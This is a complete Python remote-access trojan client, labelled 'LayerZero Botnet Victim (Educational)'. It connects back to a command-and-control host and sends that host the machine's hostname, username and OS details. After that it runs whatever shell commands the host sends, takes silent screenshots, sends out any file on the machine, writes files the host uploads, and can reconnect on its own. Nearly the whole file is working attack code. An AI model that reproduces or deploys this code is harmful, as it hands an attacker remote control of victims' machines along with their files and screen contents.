# ============================================================================================
# LIBRARY IMPORTS
# ============================================================================================

import socket       # Network communication
import json         # Data serialization
import subprocess   # System command execution
import os           # OS interaction
import base64       # Binary-to-text encoding for file transfers
import time         # Timing / sleep
import ssl          # TLS/SSL encryption
import struct       # Binary data packing (message length headers)
import hashlib      # Authentication hashing
import argparse     # CLI argument parsing
import sys          # System utilities
import platform     # System information gathering
import getpass      # Get current username safely


# ============================================================================================
# COMMAND-LINE ARGUMENTS
# ============================================================================================

parser = argparse.ArgumentParser(description='LayerZero Botnet Victim (Educational)')
parser.add_argument('--host', type=str, default='127.0.0.1',
                    help='Host IP to connect to (default: 127.0.0.1)')
parser.add_argument('--port', type=int, default=4444,
                    help='Host port to connect to (default: 4444)')
parser.add_argument('--auth-key', type=str, default=None,
                    help='Shared secret key for authentication. Must match the host.')
parser.add_argument('--reconnect', type=int, default=5,
                    help='Seconds between reconnect attempts (default: 5)')
parser.add_argument('--persistent', action='store_true',
                    help='Auto-reconnect to host if connection drops')
args = parser.parse_args()


# ============================================================================================
# COLOR CODES
# ============================================================================================

GREEN  = '\033[92m'
YELLOW = '\033[93m'
RED    = '\033[91m'
RESET  = '\033[0m'


# ============================================================================================
# BANNER
# ============================================================================================

BANNER = r'''
 ____ ____ ____ ____ ____ _________ ____ ____ ____ ____
||L |||A |||Y |||E |||R |||       |||Z |||E |||R |||O ||
||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|
'''


# ============================================================================================
# CONSTANTS & PROTOCOL
# ============================================================================================
# Same framing as host: [4-byte big-endian length][JSON payload]
#
# Messages we SEND to host:
#   {"type": "response",  "data": "<string>"}
#   {"type": "error",     "message": "<string>"}
#   {"type": "auth",      "token": "<hex>"}
#   {"type": "heartbeat", "cwd": "...", "pid": N}
#   {"type": "sysinfo",   "data": {...}}
#
# Messages we RECEIVE from host:
#   {"type": "command",        "command": "<string>"}
#   {"type": "file_data",      "data": "<base64>"}
#   {"type": "auth_challenge", "challenge": "<hex>"}
#   {"type": "auth_result",    "success": true|false}
#   {"type": "ping"}

MAX_MESSAGE_SIZE = 50 * 1024 * 1024   # 50 MB
HEADER_SIZE      = 4
RECV_CHUNK       = 4096

# Global connection socket
connection = None


# ============================================================================================
# PROTOCOL FUNCTIONS
# ============================================================================================

def protocol_send(data):
    """Send a length-prefixed JSON message to the host. Returns True on success."""
    global connection
    try:
        json_data = json.dumps(data).encode('utf-8')
        if len(json_data) > MAX_MESSAGE_SIZE:
            return False
        header = struct.pack('>I', len(json_data))
        connection.sendall(header + json_data)
        return True
    except (BrokenPipeError, ConnectionResetError, OSError):
        return False


def protocol_receive(timeout=30):
    """Receive a length-prefixed JSON message from the host. Returns dict or None."""
    global connection
    try:
        connection.settimeout(timeout)

        header = b''
        while len(header) < HEADER_SIZE:
            chunk = connection.recv(HEADER_SIZE - len(header))
            if not chunk:
                return None
            header += chunk

        msg_len = struct.unpack('>I', header)[0]
        if msg_len > MAX_MESSAGE_SIZE or msg_len == 0:
            return None

        data = b''
        while len(data) < msg_len:
            to_read = min(RECV_CHUNK, msg_len - len(data))
            chunk = connection.recv(to_read)
            if not chunk:
                return None
            data += chunk

        return json.loads(data.decode('utf-8'))

    except socket.timeout:
        return None
    except (ConnectionResetError, BrokenPipeError, OSError):
        return None
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None


def send_response(data_str):
    """Send a successful response to the host."""
    return protocol_send({'type': 'response', 'data': str(data_str)})


def send_error(message_str):
    """Send an error message to the host."""
    return protocol_send({'type': 'error', 'message': str(message_str)})


def send_heartbeat():
    """Send a heartbeat with current state info."""
    try:
        _os = f'{platform.system()} {platform.release()}'
    except Exception:
        _os = ''
    return protocol_send({
        'type': 'heartbeat',
        'cwd': os.getcwd(),
        'pid': os.getpid(),
        'os':  _os,
    })


# ============================================================================================
# SYSTEM INFORMATION GATHERING
# ============================================================================================

def gather_sysinfo():
    """Collect system information about this machine."""
    info = {}
    try:
        info['hostname'] = platform.node()
    except Exception:
        info['hostname'] = 'unknown'
    try:
        info['username'] = getpass.getuser()
    except Exception:
        info['username'] = 'unknown'
    try:
        info['os'] = f'{platform.system()} {platform.release()}'
    except Exception:
        info['os'] = 'unknown'
    try:
        info['architecture'] = platform.machine()
    except Exception:
        info['architecture'] = 'unknown'
    try:
        info['python'] = platform.python_version()
    except Exception:
        info['python'] = 'unknown'
    try:
        info['cwd'] = os.getcwd()
    except Exception:
        info['cwd'] = 'unknown'
    try:
        info['pid'] = str(os.getpid())
    except Exception:
        info['pid'] = 'unknown'
    try:
        info['home'] = os.path.expanduser('~')
    except Exception:
        info['home'] = 'unknown'
    return info


# ============================================================================================
# SCREENSHOT CAPTURE
# ============================================================================================

def take_screenshot():
    """Attempt to capture a screenshot. Returns base64-encoded PNG or None."""
    try:
        # Try PIL/Pillow first
        from PIL import ImageGrab
        import io
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        return base64.b64encode(buf.getvalue()).decode('utf-8')
    except ImportError:
        pass
    except Exception:
        pass

    try:
        # macOS fallback using screencapture
        if platform.system() == 'Darwin':
            tmp = '/tmp/.sc_tmp.png'
            ret = os.system(f'screencapture -x {tmp} 2>/dev/null')
            if ret == 0 and os.path.exists(tmp):
                with open(tmp, 'rb') as f:
                    data = base64.b64encode(f.read()).decode('utf-8')
                os.remove(tmp)
                return data
    except Exception:
        pass

    try:
        # Linux fallback using scrot
        if platform.system() == 'Linux':
            tmp = '/tmp/.sc_tmp.png'
            ret = os.system(f'scrot {tmp} 2>/dev/null')
            if ret == 0 and os.path.exists(tmp):
                with open(tmp, 'rb') as f:
                    data = base64.b64encode(f.read()).decode('utf-8')
                os.remove(tmp)
                return data
    except Exception:
        pass

    return None


# ============================================================================================
# CONNECTION
# ============================================================================================

def connect_to_host(ip, port):
    """Connect to the host with TLS + auth. Retries every N seconds."""
    global connection

    while True:
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(10)

            # Try TLS first
            try:
                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                connection = ssl_context.wrap_socket(raw_sock, server_hostname=ip)
                connection.connect((ip, port))
            except (ssl.SSLError, OSError):
                # Fall back to plaintext
                try:
                    raw_sock.close()
                except OSError:
                    pass
                raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw_sock.settimeout(10)
                raw_sock.connect((ip, port))
                connection = raw_sock

            # Reset timeout for normal operation
            connection.settimeout(None)

            # Authentication
            if args.auth_key:
                if not do_authentication():
                    print(RED + '[-] Authentication failed. Retrying...' + RESET)
                    try:
                        connection.close()
                    except OSError:
                        pass
                    connection = None
                    time.sleep(args.reconnect)
                    continue

            return  # Success

        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            try:
                raw_sock.close()
            except Exception:
                pass
            connection = None
            time.sleep(args.reconnect)


def do_authentication():
    """Challenge-response auth handshake. Returns True on success."""
    try:
        challenge_msg = protocol_receive(timeout=10)
        if challenge_msg is None:
            return False
        if challenge_msg.get('type') != 'auth_challenge':
            return True  # Host may not require auth

        challenge = challenge_msg.get('challenge', '')
        if not isinstance(challenge, str) or not challenge:
            return False

        token = hashlib.sha256((args.auth_key + challenge).encode()).hexdigest()
        if not protocol_send({'type': 'auth', 'token': token}):
            return False

        result = protocol_receive(timeout=10)
        if result is None:
            return False
        return result.get('type') == 'auth_result' and result.get('success') is True

    except Exception:
        return False


# ============================================================================================
# MAIN COMMAND LOOP
# ============================================================================================

def run():
    """Receive and execute commands from the host.
    All errors are caught and forwarded to the host."""

    # Announce ourselves immediately so the host knows our OS/hostname right away.
    try:
        protocol_send({'type': 'sysinfo', 'data': gather_sysinfo()})
    except Exception:
        pass

    while True:
        try:
            msg = protocol_receive(timeout=None)  # Block indefinitely
        except Exception:
            break

        if msg is None:
            break  # Connection lost

        if not isinstance(msg, dict) or 'type' not in msg:
            send_error('Invalid message format')
            continue

        msg_type = msg.get('type')

        # ---- PING (heartbeat request) ----
        if msg_type == 'ping':
            send_heartbeat()
            continue

        # ---- COMMAND ----
        if msg_type == 'command':
            command = msg.get('command', '').strip()
            if not command:
                send_error('Empty command')
                continue

            try:
                # --- EXIT ---
                if command == 'exit':
                    break

                # --- CLEAR (display-only — just ack with empty response) ---
                elif command == 'clear':
                    send_response('')

                # --- CD ---
                elif command == 'cd' or command.startswith('cd '):
                    # 'cd' alone -> go home; 'cd path' -> go to path
                    if command == 'cd':
                        path = os.path.expanduser('~')
                    else:
                        path = command[3:].strip()
                        if not path:
                            path = os.path.expanduser('~')
                    try:
                        os.chdir(path)
                        send_response('')
                    except FileNotFoundError:
                        send_error(f'Directory not found: {path}')
                    except PermissionError:
                        send_error(f'Permission denied: {path}')
                    except NotADirectoryError:
                        send_error(f'Not a directory: {path}')
                    except Exception as e:
                        send_error(f'cd failed: {e}')

                # --- SYSINFO ---
                elif command == 'sysinfo':
                    try:
                        info = gather_sysinfo()
                        protocol_send({'type': 'sysinfo', 'data': info})
                    except Exception as e:
                        send_error(f'sysinfo failed: {e}')

                # --- SCREENSHOT ---
                elif command == 'screenshot':
                    try:
                        data = take_screenshot()
                        if data:
                            send_response(data)
                        else:
                            send_error('Screenshot not available (no PIL, screencapture, or scrot)')
                    except Exception as e:
                        send_error(f'Screenshot failed: {e}')

                # --- DOWNLOAD (host wants a file from us) ---
                elif command.startswith('download '):
                    filepath = command[9:].strip()
                    try:
                        if not filepath:
                            send_error('No filename specified')
                        elif not os.path.exists(filepath):
                            send_error(f'Path not found: {filepath}')
                        elif not os.path.isfile(filepath):
                            send_error(f'Not a file: {filepath}')
                        else:
                            with open(filepath, 'rb') as f:
                                file_bytes = f.read()
                            encoded = base64.b64encode(file_bytes).decode('utf-8')
                            send_response(encoded)
                    except PermissionError:
                        send_error(f'Permission denied: {filepath}')
                    except IsADirectoryError:
                        send_error(f'Is a directory: {filepath}')
                    except Exception as e:
                        send_error(f'Download failed: {e}')

                # --- UPLOAD (host is sending us a file) ---
                elif command.startswith('upload '):
                    filename = command[7:].strip()
                    if not filename:
                        send_error('No filename specified')
                        continue
                    try:
                        file_msg = protocol_receive(timeout=60)
                        if file_msg is None:
                            send_error('Did not receive file data (timeout)')
                        elif file_msg.get('type') != 'file_data':
                            send_error(f'Expected file_data, got: {file_msg.get("type")}')
                        else:
                            file_data = base64.b64decode(file_msg['data'])
                            # Sanitize: only use the basename to prevent path traversal
                            safe_name = os.path.basename(filename)
                            if not safe_name:
                                safe_name = 'uploaded_file'
                            with open(safe_name, 'wb') as f:
                                f.write(file_data)
                            send_response(f'File saved: {safe_name}')
                    except PermissionError:
                        send_error(f'Permission denied writing: {filename}')
                    except Exception as e:
                        send_error(f'Upload failed: {e}')

                # --- ANY OTHER COMMAND ---
                else:
                    try:
                        process = subprocess.Popen(
                            command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            universal_newlines=True,
                        )
                        stdout, stderr = process.communicate(timeout=30)
                        result = stdout + stderr
                        send_response(result if result else '')
                    except subprocess.TimeoutExpired:
                        process.kill()
                        process.communicate()  # Clean up zombie process
                        send_error(f'Command timed out (30s): {command}')
                    except FileNotFoundError:
                        send_error(f'Command not found: {command.split()[0]}')
                    except Exception as e:
                        send_error(f'Execution failed: {e}')

            except Exception as e:
                try:
                    send_error(f'Unexpected error: {e}')
                except Exception:
                    break  # Connection dead

        # ---- UNKNOWN MESSAGE TYPE ----
        else:
            send_error(f'Unknown message type: {msg_type}')


# ============================================================================================
# MAIN
# ============================================================================================

def main():
    global connection

    print(GREEN + BANNER + RESET)

    while True:
        print(YELLOW + f'[+] Connecting to host at {args.host}:{args.port}...' + RESET)

        connect_to_host(args.host, args.port)
        print(GREEN + '[+] Connected! Awaiting commands...' + RESET)

        try:
            run()
        except Exception:
            pass
        finally:
            try:
                if connection:
                    connection.close()
            except Exception:
                pass
            connection = None

        if not args.persistent:
            print(YELLOW + '[*] Disconnected from host.' + RESET)
            break

        # Persistent mode: reconnect
        print(YELLOW + f'[*] Connection lost. Reconnecting in {args.reconnect}s...' + RESET)
        time.sleep(args.reconnect)

    print(YELLOW + '[*] Exiting.' + RESET)


if __name__ == '__main__':
    main()
